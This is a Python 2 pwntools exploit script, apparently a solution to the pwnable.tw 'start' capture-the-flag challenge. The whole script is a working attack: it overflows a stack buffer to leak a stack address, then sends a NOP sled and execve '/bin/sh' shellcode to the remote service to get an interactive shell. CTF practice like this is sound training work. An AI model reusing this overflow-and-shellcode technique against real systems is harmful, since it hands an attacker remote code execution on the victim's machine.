from pwn import *

debug = False

if debug:
	s = process('./start')
	context.terminal = ['xfce4-terminal', '-x', 'sh', '-c']
	gdb.attach(proc.pidof(s)[0],'b _start')
else:
	s = remote('chall.pwnable.tw',10000)

addr_1 = p32(0x08048087) # mov ecx, esp
shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'

def leak():
	recv = s.recvuntil(':')
	print recv
	payload = 'a'*20 + addr_1
	s.send(payload)
	print 'send: ' + payload
	stack_addr = s.recv(4)
	print 'stack address is : ' + hex(u32(stack_addr))
	print 'stack address+20 is : {}'.format(hex(u32(stack_addr)+20))
	#print 'stack address is : ' + hex(int(u32(stack_addr),16)+20)
	return u32(stack_addr)

def pwn(addr):
	payload = 'a'*20 + p32(addr+20) + '\x90'*10 + shellcode
	s.send(payload)
	print 'send: ' + payload

addr_2 = leak()
pwn(addr_2)
s.interactive()